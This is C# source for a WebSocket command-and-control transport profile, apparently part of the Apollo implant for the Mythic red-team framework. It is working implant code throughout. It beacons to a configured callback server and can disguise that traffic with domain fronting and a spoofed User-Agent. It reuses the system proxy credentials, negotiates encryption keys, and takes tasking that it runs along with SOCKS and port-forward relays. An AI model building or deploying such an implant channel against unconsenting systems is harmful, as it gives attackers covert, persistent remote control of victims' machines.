using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Globalization;
using System.Net;
using System.Text;
using System.Threading;
using ST = System.Threading.Tasks;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Types.Delegates;
using ApolloInterop.Enums.ApolloEnums;
using ApolloInterop.Serializers;
using WebsocketTransport.Models;
using WebSocketSharp;

namespace WebsocketTransport
{
    public class WebsocketProfile : C2Profile, IC2Profile
    {
        private sealed class Connection
        {
            internal readonly WebSocket Socket;
            internal readonly CancellationTokenSource Cancellation = new CancellationTokenSource();
            internal readonly BlockingCollection<byte[]> Outgoing = new BlockingCollection<byte[]>();
            internal readonly ConcurrentDictionary<MessageType, BlockingCollection<IMythicMessage>> Incoming = new ConcurrentDictionary<MessageType, BlockingCollection<IMythicMessage>>();
            internal readonly ST.TaskCompletionSource<bool> Ended = new ST.TaskCompletionSource<bool>();
            internal readonly List<ST.Task> Workers = new List<ST.Task>();
            internal readonly object Lifetime = new object();
            internal bool Disposed;
            internal int Started;
            internal EventHandler<MessageEventArgs> OnMessage;
            internal EventHandler<WebSocketSharp.ErrorEventArgs> OnError;
            internal EventHandler<CloseEventArgs> OnClose;

            internal Connection(WebSocket socket) { Socket = socket; }
            internal BlockingCollection<IMythicMessage> Messages(MessageType type)
            {
                return Incoming.GetOrAdd(type, _ => new BlockingCollection<IMythicMessage>());
            }
            internal void Cancel()
            {
                lock (Lifetime)
                    if (!Disposed)
                    {
                        Cancellation.Cancel();
                        Ended.TrySetResult(true);
                    }
            }
        }

        private readonly object connectionLock = new object();
        private readonly string endpoint;
        private readonly string payloadUuid;
        private readonly string taskingType;
        private readonly string userAgent;
        private readonly string domainFront;
        private readonly bool encryptedExchange;
        private readonly DateTimeOffset? killDate;
        private readonly JsonSerializer jsonSerializer = new JsonSerializer();
        private readonly RSAKeyGenerator rsa;
        private bool uuidNegotiated;
        private volatile bool keyExchanged;
        private Connection connection;
        internal WebSocket Client { get { return connection == null ? null : connection.Socket; } }

        internal static string BuildEndpoint(string host, int port, string path)
        {
            var uri = new UriBuilder(host);
            if (uri.Scheme != "ws" && uri.Scheme != "wss")
                throw new ArgumentException("The callback host must use ws:// or wss://.", nameof(host));
            uri.Port = port;
            uri.Path = uri.Path.TrimEnd('/') + "/" + (path ?? "").TrimStart('/');
            return uri.Uri.AbsoluteUri;
        }

        public WebsocketProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
        {
            payloadUuid = agent.GetUUID();
            endpoint = BuildEndpoint(data["callback_host"], int.Parse(data["callback_port"], CultureInfo.InvariantCulture), data["ENDPOINT_REPLACE"]);
            taskingType = data["tasking_type"];
            if (taskingType != "Poll" && taskingType != "Push")
                throw new ArgumentException("Unknown WebSocket tasking type: " + taskingType);
            userAgent = data["USER_AGENT"];
            domainFront = data["domain_front"];
            encryptedExchange = data["encrypted_exchange_check"] == "T";
            if (encryptedExchange) rsa = agent.GetApi().NewRSAKeyPair(4096);
            string date = data["killdate"];
            if (!string.IsNullOrWhiteSpace(date) && date != "-1")
                killDate = DateTimeOffset.Parse(date, CultureInfo.InvariantCulture, DateTimeStyles.AssumeUniversal | DateTimeStyles.AdjustToUniversal);
            Agent.SetSleep(int.Parse(data["callback_interval"], CultureInfo.InvariantCulture), double.Parse(data["callback_jitter"], CultureInfo.InvariantCulture));
        }

        private bool AgentAlive()
        {
            if (killDate.HasValue && DateTimeOffset.UtcNow >= killDate.Value)
            {
                Agent.Exit();
                return false;
            }
            return Agent.IsAlive();
        }

        private bool Running(Connection c)
        {
            return !c.Cancellation.IsCancellationRequested && AgentAlive() && c.Socket.ReadyState == WebSocketState.Open;
        }

        private void StartWorker(Connection c, Action action)
        {
            c.Workers.Add(ST.Task.Factory.StartNew(() =>
            {
                try { action(); }
                catch (OperationCanceledException) { }
                catch (Exception ex) { System.Diagnostics.Debug.WriteLine(ex); }
                finally { c.Cancel(); }
            }, CancellationToken.None, ST.TaskCreationOptions.LongRunning, ST.TaskScheduler.Default));
        }

        private void Cleanup(Connection c)
        {
            c.Cancel();
            c.Socket.OnMessage -= c.OnMessage;
            c.Socket.OnError -= c.OnError;
            c.Socket.OnClose -= c.OnClose;
            try { c.Socket.Close(); }
            catch (Exception ex) { System.Diagnostics.Debug.WriteLine(ex); }
            ST.Task.WaitAll(c.Workers.ToArray());
            lock (c.Lifetime)
            {
                c.Disposed = true;
                c.Outgoing.Dispose();
                foreach (var queue in c.Incoming.Values) queue.Dispose();
                c.Cancellation.Dispose();
            }
            if (ReferenceEquals(connection, c))
            {
                connection = null;
                Connected = false;
            }
        }

        private bool Enqueue(Connection c, IMythicMessage message)
        {
            if (!Running(c)) return false;
            var envelope = new WebSocketMessage { client = true, data = Serializer.Serialize(message), tag = string.Empty };
            c.Outgoing.Add(Encoding.UTF8.GetBytes(jsonSerializer.Serialize(envelope)), c.Cancellation.Token);
            return true;
        }

        private bool Receive(Connection c, MessageType type, OnResponse<IMythicMessage> onResponse, CancellationToken token)
        {
            try { return onResponse(c.Messages(type).Take(token)); }
            catch (OperationCanceledException) { return false; }
        }

        private void OnMessage(Connection c, MessageEventArgs args)
        {
            // Synchronize disposal with a callback already dispatched by the socket.
            lock (c.Lifetime)
            {
                if (c.Disposed || c.Cancellation.IsCancellationRequested) return;
                try
                {
                    var envelope = WebsocketJsonContext.Deserialize<WebSocketMessage>(args.IsBinary ? Encoding.UTF8.GetString(args.RawData) : args.Data);
                    IMythicMessage message = encryptedExchange && !keyExchanged
                        ? (IMythicMessage)Serializer.Deserialize<EKEHandshakeResponse>(envelope.data)
                        : Serializer.Deserialize<MessageResponse>(envelope.data);
                    c.Messages(message.GetTypeCode()).Add(message);
                }
                catch (Exception ex)
                {
                    System.Diagnostics.Debug.WriteLine(ex);
                    c.Cancel();
                }
            }
        }

        public bool Connect(CheckinMessage checkin, OnResponse<MessageResponse> onResponse)
        {
            lock (connectionLock)
            {
                if (connection != null) Cleanup(connection);
                if (!AgentAlive()) return false;
                var socket = new WebSocket(endpoint) { WaitTime = TimeSpan.FromSeconds(5) };
                socket.Log.Level = LogLevel.Error;
                var headers = new List<KeyValuePair<string, string>>();
                if (taskingType == "Push") headers.Add(new KeyValuePair<string, string>("Accept-Type", "Push"));
                if (!string.IsNullOrEmpty(userAgent)) headers.Add(new KeyValuePair<string, string>("User-Agent", userAgent));
                if (!string.IsNullOrEmpty(domainFront)) headers.Add(new KeyValuePair<string, string>("Host", domainFront));
                socket.CustomHeaders = headers;
                var proxy = WebRequest.GetSystemWebProxy();
                var target = new Uri(endpoint);
                var proxyUri = proxy.GetProxy(target);
                if (proxyUri != null && proxyUri != target && !proxy.IsBypassed(target))
                {
                    var credential = proxy.Credentials == null ? null : proxy.Credentials.GetCredential(proxyUri, "Basic");
                    socket.SetProxy(proxyUri.AbsoluteUri, credential == null ? "" : credential.UserName, credential == null ? "" : credential.Password);
                }
                var c = new Connection(socket);
                connection = c;
                c.OnMessage = (sender, args) => OnMessage(c, args);
                c.OnError = (sender, args) => c.Cancel();
                c.OnClose = (sender, args) => c.Cancel();
                socket.OnMessage += c.OnMessage;
                socket.OnError += c.OnError;
                socket.OnClose += c.OnClose;
                bool success = false;
                try
                {
                    socket.Connect();
                    if (!Running(c)) return false;
                    StartWorker(c, () =>
                    {
                        foreach (byte[] bytes in c.Outgoing.GetConsumingEnumerable(c.Cancellation.Token))
                        {
                            if (!Running(c)) break;
                            socket.Send(bytes);
                        }
                    });
                    StartWorker(c, () =>
                    {
                        while (Running(c))
                        {
                            if (!socket.Ping()) break;
                            if (c.Cancellation.Token.WaitHandle.WaitOne(5000)) break;
                        }
                    });
                    using (var handshake = CancellationTokenSource.CreateLinkedTokenSource(c.Cancellation.Token))
                    {
                        handshake.CancelAfter(TimeSpan.FromSeconds(30));
                        if (encryptedExchange && !keyExchanged)
                        {
                            if (!Enqueue(c, new EKEHandshakeMessage { Action = "staging_rsa", PublicKey = rsa.ExportPublicKey(), SessionID = rsa.SessionId })) return false;
                            if (!Receive(c, MessageType.EKEHandshakeResponse, message =>
                            {
                                var response = (EKEHandshakeResponse)message;
                                byte[] key = rsa.RSA.Decrypt(Convert.FromBase64String(response.SessionKey), true);
                                ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(key));
                                ((ICryptographySerializer)Serializer).UpdateUUID(response.UUID);
                                Agent.SetUUID(response.UUID);
                                keyExchanged = true;
                                return true;
                            }, handshake.Token)) return false;
                        }
                        // Enrollment identifies the original payload inside the message;
                        // RSA staging changes only the outer cryptographic identity.
                        checkin.UUID = uuidNegotiated ? Agent.GetUUID() : payloadUuid;
                        if (!Enqueue(c, checkin)) return false;
                        success = Receive(c, MessageType.MessageResponse, message =>
                        {
                            var response = (MessageResponse)message;
                            if (!uuidNegotiated)
                            {
                                ((ICryptographySerializer)Serializer).UpdateUUID(response.ID);
                                Agent.SetUUID(response.ID);
                                checkin.UUID = response.ID;
                                uuidNegotiated = true;
                            }
                            return onResponse(response);
                        }, handshake.Token);
                    }
                    Connected = success;
                    return success;
                }
                finally { if (!success) Cleanup(c); }
            }
        }

        public void Start()
        {
            Connection c;
            lock (connectionLock)
            {
                c = connection;
                if (c == null || !Connected || Interlocked.Exchange(ref c.Started, 1) != 0) return;
                StartWorker(c, () =>
                {
                    while (Running(c))
                        if (!Receive(c, MessageType.MessageResponse, message => Agent.GetTaskManager().ProcessMessageResponse((MessageResponse)message), c.Cancellation.Token)) break;
                });
                StartWorker(c, () =>
                {
                    var manager = Agent.GetTaskManager();
                    var notifications = manager as ITaskingMessageSource;
                    while (Running(c))
                    {
                        bool sent = manager.CreateTaskingMessage(message =>
                        {
                            if (taskingType == "Push" && message.Delegates.Length == 0 && message.Responses.Length == 0 && message.Socks.Length == 0 && message.Rpfwd.Length == 0 && message.Edges.Length == 0) return false;
                            return Enqueue(c, message);
                        });
                        if (taskingType == "Poll") Agent.Sleep(new[] { c.Cancellation.Token.WaitHandle });
                        else if (!sent)
                        {
                            if (notifications != null)
                                WaitHandle.WaitAny(new[] { notifications.TaskingAvailable, c.Cancellation.Token.WaitHandle });
                            else c.Cancellation.Token.WaitHandle.WaitOne(100);
                        }
                    }
                });
            }
            c.Ended.Task.Wait();
            lock (connectionLock)
                if (ReferenceEquals(connection, c)) Cleanup(c);
        }

        public bool IsOneWay() { return false; }
        public bool IsConnected()
        {
            lock (connectionLock)
                return Connected && connection != null && Running(connection);
        }
        public bool Connect() { return true; }
        public bool Send<T>(T message) { throw new NotSupportedException("WebsocketProfile does not support Send only."); }
        public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse) { throw new NotSupportedException(); }
        public bool Recv(MessageType type, OnResponse<IMythicMessage> onResponse)
        {
            var c = connection;
            return c != null && Receive(c, type, onResponse, c.Cancellation.Token);
        }
    }
}
